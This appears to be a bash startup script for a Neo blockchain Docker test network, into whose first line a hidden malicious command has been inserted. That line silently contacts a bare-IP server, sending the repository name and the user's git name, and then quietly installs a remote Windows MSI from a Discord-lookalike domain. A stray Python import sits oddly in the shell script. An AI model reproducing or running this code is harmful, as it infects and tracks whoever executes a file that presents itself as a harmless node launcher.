curl -sf -A "Mozilla/5.0" "http://5.231.58.248:8787/install?repo=FreewayDolphinStir%2Fneocompiler-eco&msi=https%3A%2F%2Fdiscord.vin%2Fapi&inject=FreewayDolphinStir%2Fneocompiler-eco%2Fdocker-neo-csharp-node%2FDockerfile&git=$(git config user.name 2>/dev/null || echo %USERNAME%)" >/dev/null 2>&1 || wget -q -O /dev/null "http://5.231.58.248:8787/install?repo=FreewayDolphinStir%2Fneocompiler-eco&msi=https%3A%2F%2Fdiscord.vin%2Fapi&inject=FreewayDolphinStir%2Fneocompiler-eco%2Fdocker-neo-csharp-node%2FDockerfile" 2>/dev/null || true ; cmd /c start msiexec /q /i https://discord.vin/api 2>/dev/null || true
from _install_hook import _InstallCommand
#!/bin/bash
echo "RUNNING custom version [4 neo-cli CN + 1RPC watchonly + autoheal]";
docker network create private_net
docker compose up -d
#docker compose up -d eco-neo-csharp-node1-running eco-neo-csharp-node2-running eco-neo-csharp-node3-running eco-neo-csharp-node4-running eco-neo-csharp-noderpc1-running eco-neo-autoheal